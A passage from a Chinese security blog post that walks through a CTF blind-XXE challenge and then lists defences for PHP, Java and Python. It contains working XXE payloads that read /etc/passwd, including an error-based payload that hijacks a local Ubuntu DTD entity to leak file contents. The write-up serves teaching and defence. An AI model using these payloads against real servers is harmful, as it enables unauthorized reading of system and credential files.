<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0" encoding = "utf-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE message[</span></span><br><span class="line"><span class="meta">	&lt;!ELEMENT message ANY &gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>135601360123502401401250<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/xxe/8.png" alt=""></p>
<p>如果未声明<strong>message</strong>元素的话，服务器会返回：<strong>No declaration for element message</strong>的报错信息</p>
<p>成功返回查询结果</p>
<p>然后尝试读取文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message[</span><br><span class="line">	&lt;!ELEMENT message ANY &gt;</span><br><span class="line">	&lt;!ENTITY name SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;&amp;name;&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/xxe/9.png" alt=""></p>
<p>同样，我们读取一个不存在的文件时：</p>
<p><img src="../../../../img/xxe/10.png" alt=""></p>
<p>出现了报错信息，说明这是一个<strong>没有回显</strong>的xxe，并且同样禁用了<strong>http</strong>协议</p>
<p>那么，我们就要尝试去寻找本地dtd文件：</p>
<p>本题目存在ubuntu系统自带的<code>/usr/share/yelp/dtd/docbookx.dtd</code>文件，docbookx.dtd文件具有<strong>ISOamso</strong>实体，我们可以重新定义它，触发错误信息 </p>
<p>传入payload：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % ISOamso '</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;test&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">        &amp;#x25;eval;</span></span><br><span class="line"><span class="meta">        &amp;#x25;error;</span></span><br><span class="line"><span class="meta">    '&gt;</span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/xxe/11.png" alt=""></p>
<p>最后读取flag：</p>
<p><img src="../../../../img/xxe/12.png" alt=""></p>
<h2 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h2><ul>
<li>使用开发语言提供的禁用外部实体的方法：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>

<ul>
<li>过滤用户提交的XML数据关键词：<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>,或者,<code>SYSTEM</code>和<code>PUBLIC</code> </li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/column/181064.html" target="_blank" rel="noopener">XXE(XML External Entity attack)XML外部实体注入攻击</a></p>
<p><a href="http://yugod.xmutsec.com/index.php/2019/07/14/50.html" target="_blank" rel="noopener">Blind-XXE与Google CTF 2019-BNV</a></p>
<p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">未知攻焉知防——XXE漏洞攻防</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" target="_blank" rel="noopener">Somnus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nikoeurus.github.io/2019/11/06/XXE%E6%80%BB%E7%BB%93/">https://nikoeurus.github.io/2019/11/06/XXE%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Nikoeurus.github.io">Somnus's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/xxe/">xxe</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/11/07/HarekazeCTF2019-Web/"><i class="fa fa-chevron-left">  </i><span>2019 HarekazeCTF-Web部分复现WriteUp</span></a></div><div class="next-post pull-right"><a href="/2019/11/04/lfi2019/"><span>2019 xctf-finals Web-lfi2019复现</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'piszMlsB7MhecwDRlz0IFCop-gzGzoHsz',
  appKey:'PHmvwpbyTPCcD3D52L1CoTlp',
  placeholder:'Just go go',
  avatar:'wavatar',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(/img/background.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2019 By Somnus</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>